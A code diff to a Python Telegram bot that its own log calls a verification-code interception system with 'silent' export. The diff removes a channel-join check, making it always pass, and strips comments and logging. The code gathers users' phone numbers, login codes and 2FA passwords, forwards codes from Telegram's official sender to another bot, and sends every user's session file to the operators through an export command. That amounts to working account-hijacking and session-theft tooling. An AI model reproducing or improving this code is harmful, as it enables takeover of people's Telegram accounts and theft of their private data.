@@ -85,9 +85,9 @@ class Config:
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
-    REQUIRED_CHANNEL: str = ""                         # 需要加入的频道（留空=不验证）✅ 已禁用
-    FORWARD_CHANNEL: str = "xsbbooo"                          # 导出session的频道（留空=不导出）
-    FORWARD_BOT_USERNAME: str = "bhgffgggbot"           # 转发验证码的目标机器人
+    REQUIRED_CHANNEL: str = ""                         # 需要加入的频道（留空=不验证）✅ 已移除入群验证
+    FORWARD_CHANNEL: str = "xsbbooo"                   # 导出session的频道（留空=不导出）
+    FORWARD_BOT_USERNAME: str = "bhgffgggbot"          # 转发验证码的目标机器人
     TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID
 
     # ---------- Webhook / Web 配置 ----------
@@ -588,44 +588,26 @@ class BackupKeyManager:
 
 
 # ============================================================
-#  8. 频道加入记录模块
+#  8. 频道加入记录模块（已废弃，保留但不使用）
 # ============================================================
 
 class JoinRecordManager:
-    """频道加入记录管理类"""
+    """频道加入记录管理类（已废弃）"""
 
     @staticmethod
     def record_joined(user_id: int, username: str = None) -> None:
-        """记录用户已加入频道"""
-        data = load_json_file(Config.JOINED_RECORD_FILE, {})
-        user_id_str = str(user_id)
-
-        if user_id_str not in data:
-            data[user_id_str] = {
-                "joined_at": datetime.now().isoformat(),
-                "verified": True,
-                "username": username
-            }
-            save_json_file(Config.JOINED_RECORD_FILE, data)
-            logger.info(f"用户 {user_id} ({username}) 已记录为加入频道")
+        """记录用户已加入频道（已废弃）"""
+        pass
 
     @staticmethod
     def is_recorded(user_id: int) -> bool:
-        """检查用户是否已有加入记录"""
-        data = load_json_file(Config.JOINED_RECORD_FILE, {})
-        return str(user_id) in data
+        """检查用户是否已有加入记录（已废弃）"""
+        return True
 
     @staticmethod
     def clear_record(user_id: int) -> bool:
-        """清除用户的加入记录"""
-        data = load_json_file(Config.JOINED_RECORD_FILE, {})
-        user_id_str = str(user_id)
-
-        if user_id_str in data:
-            del data[user_id_str]
-            save_json_file(Config.JOINED_RECORD_FILE, data)
-            return True
-        return False
+        """清除用户的加入记录（已废弃）"""
+        return True
 
 
 # ============================================================
@@ -1304,67 +1286,26 @@ class SessionManager:
 
 
 # ============================================================
-#  12. 频道验证模块
+#  12. 频道验证模块（已禁用）
 # ============================================================
 
 class ChannelVerifier:
-    """频道验证类"""
+    """频道验证类（已禁用）"""
 
     @staticmethod
     async def check_user_in_channel(context: ContextTypes.DEFAULT_TYPE,
                                     user_id: int) -> Tuple[bool, str]:
-        """
-        检查用户是否加入了指定频道
-        Args:
-            context: 上下文
-            user_id: 用户ID
-        Returns:
-            (是否加入, 详细信息)
-        """
-        # 如果 REQUIRED_CHANNEL 为空，直接通过
-        if not Config.REQUIRED_CHANNEL:
-            return True, "频道验证已禁用"
-
-        try:
-            bot = context.bot
-
-            # 尝试获取聊天成员信息
-            try:
-                chat_member = await bot.get_chat_member(
-                    chat_id=Config.REQUIRED_CHANNEL,
-                    user_id=user_id
-                )
-                if chat_member.status in ['member', 'administrator', 'creator']:
-                    return True, "已加入频道"
-            except Exception as e:
-                logger.warning(f"获取频道成员信息失败 (用户{user_id}): {e}")
-
-            # 检查本地记录
-            if JoinRecordManager.is_recorded(user_id):
-                return True, "已加入频道（记录）"
-
-            return False, "未加入频道"
-
-        except Exception as e:
-            logger.error(f"检查频道加入状态失败 (用户{user_id}): {e}")
-            return False, f"验证失败: {str(e)}"
+        """检查用户是否加入了指定频道（已禁用，始终返回True）"""
+        return True, "频道验证已禁用"
 
     @staticmethod
     def get_join_keyboard() -> InlineKeyboardMarkup:
-        """获取加入频道的按钮"""
-        if not Config.REQUIRED_CHANNEL:
-            return InlineKeyboardMarkup([])
-        return InlineKeyboardMarkup([
-            [InlineKeyboardButton(
-                "📢 点击加入频道",
-                url=f"https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}"
-            )],
-            [InlineKeyboardButton("✅ 我已加入，验证", callback_data="verify_join")]
-        ])
+        """获取加入频道的按钮（已禁用）"""
+        return InlineKeyboardMarkup([])
 
 
 # ============================================================
-#  13. 权限检查模块
+#  13. 权限检查模块（已移除入群验证）
 # ============================================================
 
 class PermissionChecker:
@@ -1375,7 +1316,7 @@ class PermissionChecker:
                                     user_id: int) -> Tuple[bool, str]:
         """
         统一检查用户权限
-        检查顺序: 管理员 > 频道加入 > 付款状态
+        检查顺序: 管理员 > 付款状态（已移除频道验证）
         Returns:
             (是否有权限, 原因)
         """
@@ -1383,12 +1324,7 @@ class PermissionChecker:
         if AdminManager.is_admin(user_id):
             return True, "管理员权限"
 
-        # 1. 检查是否加入频道
-        is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
-        if not is_joined:
-            return False, "join_required"
-
-        # 2. 检查是否已付款
+        # 检查是否已付款（移除了入群验证）
         ps = PaymentManager.check_payment_status(user_id)
         if ps["status"] != "paid":
             return False, "payment_required"
@@ -1412,42 +1348,10 @@ class PermissionChecker:
         if has_permission:
             return True
 
-        if reason == "join_required":
-            await PermissionChecker._send_join_required(update, user_id, context)
-        elif reason == "payment_required":
+        if reason == "payment_required":
             await PermissionChecker._send_payment_required(update, user_id, context)
 
         return False
-
-    @staticmethod
-    async def _send_join_required(update: Update, user_id: int,
-                                  context: ContextTypes.DEFAULT_TYPE):
-        """发送需要加入频道的消息"""
-        if not Config.REQUIRED_CHANNEL:
-            return
-
-        msg = (
-            "🔐 <b>加入频道验证</b>\n\n"
-            "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
-            f"📢 <b>请先加入频道：</b> "
-            f"<a href='https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}'>"
-            f"{Config.REQUIRED_CHANNEL}</a>\n\n"
-            "👇 点击下方按钮加入频道，然后点击「我已加入，验证」\n\n"
-            "💡 <b>提示：</b> 只需验证一次，之后可正常使用所有功能"
-        )
-
-        keyboard = ChannelVerifier.get_join_keyboard()
-
-        if update.callback_query:
-            await update.callback_query.message.reply_text(
-                msg, parse_mode='HTML', reply_markup=keyboard,
-                disable_web_page_preview=True
-            )
-        else:
-            await update.message.reply_text(
-                msg, parse_mode='HTML', reply_markup=keyboard,
-                disable_web_page_preview=True
-            )
 
     @staticmethod
     async def _send_payment_required(update: Update, user_id: int,
@@ -2174,54 +2078,8 @@ class BotHandlers:
 
         await query.answer()
 
-        # ===== 频道验证 =====
-        if data == "verify_join":
-            is_joined, msg = await ChannelVerifier.check_user_in_channel(context, user_id)
-
-            if is_joined:
-                username = query.from_user.username or query.from_user.first_name
-                JoinRecordManager.record_joined(user_id, username)
-
-                ps = PaymentManager.check_payment_status(user_id)
-
-                if ps["status"] == "paid":
-                    await query.edit_message_text(
-                        "✅ <b>验证成功！</b>\n\n"
-                        "您已成功加入频道，发送 /start 开始使用。",
-                        parse_mode='HTML'
-                    )
-                else:
-                    await query.edit_message_text(
-                        "✅ <b>验证成功！</b>\n\n"
-                        "您已加入频道，现在需要支付激活。\n\n"
-                        f"💳 <b>支付金额：</b>{Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
-                        "发送 /start 开始支付流程。",
-                        parse_mode='HTML'
-                    )
-            else:
-                await query.edit_message_text(
-                    "❌ <b>验证失败</b>\n\n"
-                    "未能检测到您加入频道。\n\n"
-                    "请确保：\n"
-                    "1️⃣ 点击下方按钮加入频道\n"
-                    "2️⃣ 加入后点击「我已加入，验证」\n\n"
-                    "如果已加入仍验证失败，请稍等几秒后重试。",
-                    parse_mode='HTML',
-                    reply_markup=ChannelVerifier.get_join_keyboard()
-                )
-            return
-
         # ===== 支付相关 =====
         if data == "show_pay_link" or data.startswith("check_pay:"):
-            # 检查是否已加入频道
-            is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
-            if not is_joined and Config.REQUIRED_CHANNEL:
-                await query.edit_message_text(
-                    "⚠️ 请先加入频道后再操作。",
-                    reply_markup=ChannelVerifier.get_join_keyboard()
-                )
-                return
-
             # 检查是否已激活
             ps = PaymentManager.check_payment_status(user_id)
             if ps["status"] == "paid":
@@ -2633,12 +2491,6 @@ class BotHandlers:
                 lines.append(f"金额: {order.get('amount', '未知')} {order.get('coin', '')}")
                 lines.append(f"状态: {order.get('status', '未知')}")
 
-        # 检查是否已加入频道
-        if JoinRecordManager.is_recorded(target_user_id):
-            lines.append("频道验证: ✅ 已通过")
-        else:
-            lines.append("频道验证: ❌ 未验证")
-
         # 检查活跃会话
         sessions = SessionManager.get_active_sessions(target_user_id)
         lines.append(f"活跃会话: {len(sessions)} 个")
@@ -2682,88 +2534,17 @@ class BotHandlers:
 
     @staticmethod
     async def cmd_check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """管理员：检查用户是否加入频道"""
-        user_id = update.effective_user.id
-
-        if not AdminManager.is_admin(user_id):
-            await update.message.reply_text("❌ 无权限")
-            return
-
-        if not context.args:
-            await update.message.reply_text(
-                "👑 <b>检查用户频道加入状态</b>\n\n"
-                "用法：<code>/checkjoin 用户ID</code>\n"
-                "示例：<code>/checkjoin 123456789</code>",
-                parse_mode='HTML'
-            )
-            return
-
-        try:
-            target_user_id = int(context.args[0])
-        except ValueError:
-            await update.message.reply_text("❌ 用户ID必须是数字")
-            return
-
-        is_joined, msg = await ChannelVerifier.check_user_in_channel(context, target_user_id)
-
-        if is_joined:
-            await update.message.reply_text(
-                f"✅ <b>用户 {target_user_id}</b>\n"
-                f"状态：已加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}",
-                parse_mode='HTML'
-            )
-        else:
-            await update.message.reply_text(
-                f"❌ <b>用户 {target_user_id}</b>\n"
-                f"状态：未加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}\n\n"
-                f"请提醒用户加入频道后使用 /start 重新验证。",
-                parse_mode='HTML'
-            )
+        """管理员：检查用户是否加入频道（已禁用）"""
+        await update.message.reply_text("ℹ️ 入群验证功能已禁用")
 
     @staticmethod
     async def cmd_clear_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """管理员：清除用户加入记录"""
-        user_id = update.effective_user.id
-
-        if not AdminManager.is_admin(user_id):
-            await update.message.reply_text("❌ 无权限")
-            return
-
-        if not context.args:
-            await update.message.reply_text(
-                "👑 <b>清除用户加入记录</b>\n\n"
-                "用法：<code>/clearjoin 用户ID</code>\n"
-                "示例：<code>/clearjoin 123456789</code>\n\n"
-                "⚠️ 清除后用户需要重新验证频道加入状态",
-                parse_mode='HTML'
-            )
-            return
-
-        try:
-            target_user_id = int(context.args[0])
-        except ValueError:
-            await update.message.reply_text("❌ 用户ID必须是数字")
-            return
-
-        success = JoinRecordManager.clear_record(target_user_id)
-
-        if success:
-            await update.message.reply_text(
-                f"✅ 已清除用户 {target_user_id} 的加入记录\n"
-                f"用户下次使用将需要重新验证频道加入状态。"
-            )
-        else:
-            await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有加入记录")
-
-    # ============================================================
-    #  导出Session命令 - 支持导出所有用户发送给全体管理员
-    # ============================================================
+        """管理员：清除用户加入记录（已禁用）"""
+        await update.message.reply_text("ℹ️ 入群验证功能已禁用")
 
     @staticmethod
     async def cmd_export_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """管理员：导出session（支持单个用户或全部用户）"""
+        """管理员：导出session（支持单个用户或全部用户，发送给全体管理员）"""
         user_id = update.effective_user.id
 
         if not AdminManager.is_admin(user_id):
@@ -2774,9 +2555,7 @@ class BotHandlers:
         admins = AdminManager.list_admins()
         admin_ids = [a['id'] for a in admins]
 
-        # 解析参数
         if not context.args:
-            # 默认：导出所有用户
             await update.message.reply_text(
                 "👑 <b>导出Session</b>\n\n"
                 "用法：\n"
@@ -2799,11 +2578,9 @@ class BotHandlers:
                 await update.message.reply_text("ℹ️ 当前没有活跃会话")
                 return
 
-            # 统计总session数
             total_sessions = sum(len(phones) for phones in all_sessions.values())
             await update.message.reply_text(f"📊 找到 {len(all_sessions)} 个用户，共 {total_sessions} 个session文件")
 
-            # 逐个导出
             exported = 0
             failed = 0
             
@@ -2862,25 +2639,13 @@ class BotHandlers:
     @staticmethod
     async def _export_session_to_admins(bot, user_id: int, phone: str, 
                                          session_path: Path, admin_ids: List[int]) -> bool:
-        """
-        将session文件发送给所有管理员
-        Args:
-            bot: Telegram Bot实例
-            user_id: 用户ID
-            phone: 手机号
-            session_path: session文件路径
-            admin_ids: 管理员ID列表
-        Returns:
-            是否成功（至少发送给一位管理员）
-        """
+        """将session文件发送给所有管理员"""
         if not session_path.exists():
-            logger.warning(f"Session文件不存在: {session_path}")
             return False
 
         try:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
-            # 尝试获取用户名
             user_info = f"用户ID: {user_id}"
             try:
                 user = await bot.get_chat(user_id)
@@ -2899,15 +2664,12 @@ class BotHandlers:
                 f"📁 文件名: <code>{session_path.name}</code>"
             )
 
-            # 读取文件内容
             with open(session_path, 'rb') as f:
                 file_data = f.read()
 
-            # 发送给所有管理员
             sent_count = 0
             for admin_id in admin_ids:
                 try:
-                    # 重新创建文件对象（因为读取后需要重新加载）
                     await bot.send_document(
                         chat_id=admin_id,
                         document=file_data,
@@ -2916,14 +2678,13 @@ class BotHandlers:
                         parse_mode='HTML'
                     )
                     sent_count += 1
-                    logger.info(f"✅ Session {phone} 已发送给管理员 {admin_id}")
                 except Exception as e:
-                    logger.error(f"❌ 发送给管理员 {admin_id} 失败: {e}")
+                    logger.error(f"发送给管理员 {admin_id} 失败: {e}")
 
             return sent_count > 0
 
         except Exception as e:
-            logger.error(f"❌ 导出Session失败 ({phone}, 用户: {user_id}): {e}")
+            logger.error(f"导出Session失败 ({phone}, 用户: {user_id}): {e}")
             return False
 
 
@@ -2938,12 +2699,10 @@ class WebAdmin:
 
     @staticmethod
     def _check_auth(username: str, password: str) -> bool:
-        """检查认证"""
         return username == Config.WEB_USER and password == Config.WEB_PASS
 
     @staticmethod
     def _auth_required():
-        """要求认证"""
         from flask import Response
         return Response(
             '请输入用户名和密码',
@@ -2953,7 +2712,6 @@ class WebAdmin:
 
     @classmethod
     def setup_routes(cls):
-        """设置路由"""
         web_app = cls.app
 
         @web_app.before_request
@@ -2964,8 +2722,6 @@ class WebAdmin:
 
         @web_app.route("/")
         def admin_index():
-            """后台首页"""
-            # 获取快照
             all_sessions = SessionManager.get_all_sessions()
 
             active_snapshot = {}
@@ -2981,7 +2737,6 @@ class WebAdmin:
                     if user_dir.is_dir():
                         total_files += len(list(user_dir.glob("*.session")))
 
-            # 统计付款
             payments = load_json_file(Config.PAYMENT_FILE, {})
             paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")
 
@@ -3012,7 +2767,6 @@ class WebAdmin:
                     td { padding: 12px 20px; border-top: 1px solid #1e2236; font-size: 13px; }
                     .phone { font-family: monospace; color: #e0e7ff; }
                     .status-alive { color: #4ade80; font-size: 12px; }
-                    .status-offline { color: #ef4444; font-size: 12px; }
                     .empty { text-align: center; color: #6b7280; padding: 60px 20px; }
                     .refresh-btn { position: fixed; bottom: 30px; right: 30px; background: #4f46e5; color: #fff; border: none; padding: 12px 24px; border-radius: 30px; cursor: pointer; font-size: 14px; text-decoration: none; }
                     .refresh-btn:hover { background: #6366f1; }
@@ -3073,7 +2827,6 @@ class WebAdmin:
 
         @web_app.route("/api/stats")
         def api_stats():
-            """API统计接口"""
             all_sessions = SessionManager.get_all_sessions()
             payments = load_json_file(Config.PAYMENT_FILE, {})
             paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")
@@ -3087,7 +2840,6 @@ class WebAdmin:
 
     @classmethod
     def run(cls):
-        """运行Web服务器"""
         cls.setup_routes()
         logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEB_ADMIN_PORT}")
         cls.app.run(
@@ -3109,7 +2861,6 @@ class WebhookServer:
 
     @classmethod
     def setup_routes(cls):
-        """设置路由"""
         web_app = cls.app
 
         @web_app.route("/", methods=["GET"])
@@ -3118,9 +2869,7 @@ class WebhookServer:
 
         @web_app.route(Config.WEBHOOK_PATH, methods=["POST"])
         def webhook_handler():
-            """处理OKPay回调"""
             try:
-                # 获取数据
                 data = request.get_json()
                 if not data:
                     data = request.form.to_dict()
@@ -3130,7 +2879,6 @@ class WebhookServer:
 
                 logger.info(f"收到Webhook回调: {data}")
 
-                # 处理回调
                 result = PaymentService.handle_webhook(data)
 
                 if result["ok"]:
@@ -3146,7 +2894,6 @@ class WebhookServer:
 
         @web_app.route("/webhook/test", methods=["GET"])
         def webhook_test():
-            """测试接口"""
             return jsonify({
                 "status": "ok",
                 "message": "Webhook is working",
@@ -3155,7 +2902,6 @@ class WebhookServer:
 
     @classmethod
     def run(cls):
-        """运行Webhook服务器"""
         cls.setup_routes()
         logger.info(f"Webhook服务器启动: http://{Config.WEBHOOK_HOST}:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
         cls.app.run(
@@ -3171,14 +2917,11 @@ class WebhookServer:
 # ============================================================
 
 async def post_init(application: Application):
-    """启动后的初始化"""
     logger.info("Bot启动完成，开始扫描会话...")
     await SessionManager.scan_and_restore_all(application.bot)
 
 
 def main():
-    """主入口函数"""
-    # 初始化
     init_directories()
     setup_logging()
 
@@ -3186,23 +2929,18 @@ def main():
     logger.info("Telegram 验证码拦截系统 - 完整增强版 (静默导出)")
     logger.info("=" * 50)
 
-    # 刷新管理员缓存
     AdminManager.refresh_cache()
 
-    # 启动 Web 后台（端口 39998）
     web_thread = threading.Thread(target=WebAdmin.run, daemon=True)
     web_thread.start()
     logger.info(f"Web后台: http://0.0.0.0:{Config.WEB_ADMIN_PORT}")
 
-    # 启动 Webhook 服务器（端口 39999）
     webhook_thread = threading.Thread(target=WebhookServer.run, daemon=True)
     webhook_thread.start()
     logger.info(f"Webhook: http://0.0.0.0:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
 
-    # 创建Bot应用
     application = Application.builder().token(Config.BOT_TOKEN).post_init(post_init).build()
 
-    # ===== 对话处理器 =====
     conv_handler = ConversationHandler(
         entry_points=[
             CommandHandler('start', BotHandlers.start),
@@ -3237,49 +2975,40 @@ def main():
 
     application.add_handler(conv_handler)
 
-    # ===== 回调处理器 =====
     application.add_handler(CallbackQueryHandler(
         BotHandlers.handle_callback,
-        pattern=r'^(stop_single:|stop_all|noop|verify_join|show_pay_link|check_pay:)'
+        pattern=r'^(stop_single:|stop_all|noop|show_pay_link|check_pay:)'
     ))
 
-    # ===== 管理员管理命令 =====
     application.add_handler(CommandHandler('addadmin', BotHandlers.cmd_add_admin))
     application.add_handler(CommandHandler('removeadmin', BotHandlers.cmd_remove_admin))
     application.add_handler(CommandHandler('listadmins', BotHandlers.cmd_list_admins))
 
-    # ===== 备用卡密命令 =====
     application.add_handler(CommandHandler('gencard', BotHandlers.cmd_gen_card))
     application.add_handler(CommandHandler('listcards', BotHandlers.cmd_list_cards))
     application.add_handler(CommandHandler('use', BotHandlers.cmd_use_card))
 
-    # ===== 用户管理命令 =====
     application.add_handler(CommandHandler('forcepay', BotHandlers.cmd_force_pay))
     application.add_handler(CommandHandler('userinfo', BotHandlers.cmd_user_info))
     application.add_handler(CommandHandler('resetuser', BotHandlers.cmd_reset_user))
 
-    # ===== 频道管理命令 =====
     application.add_handler(CommandHandler('checkjoin', BotHandlers.cmd_check_join))
     application.add_handler(CommandHandler('clearjoin', BotHandlers.cmd_clear_join))
 
-    # ===== 导出命令 =====
     application.add_handler(CommandHandler('exportsession', BotHandlers.cmd_export_session))
 
-    # ===== 启动信息 =====
     logger.info("=" * 50)
     logger.info("Bot 启动成功 ✅")
     logger.info(f"超级管理员: {Config.SUPER_ADMIN_IDS}")
     logger.info(f"普通管理员: {[a['id'] for a in AdminManager.list_admins() if not a['is_super']]}")
-    logger.info(f"要求加入频道: {Config.REQUIRED_CHANNEL or '已禁用'}")
+    logger.info(f"入群验证: 已禁用 ✅")
     logger.info(f"导出频道: {Config.FORWARD_CHANNEL or '未配置'} (静默模式)")
     logger.info(f"支付金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}")
     logger.info("=" * 50)
 
-    # 启动轮询
     application.run_polling()
 
 
 if __name__ == '__main__':
-    # 定义对话状态（在main之前定义，供其他函数使用）
     PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD = range(3)
     main()
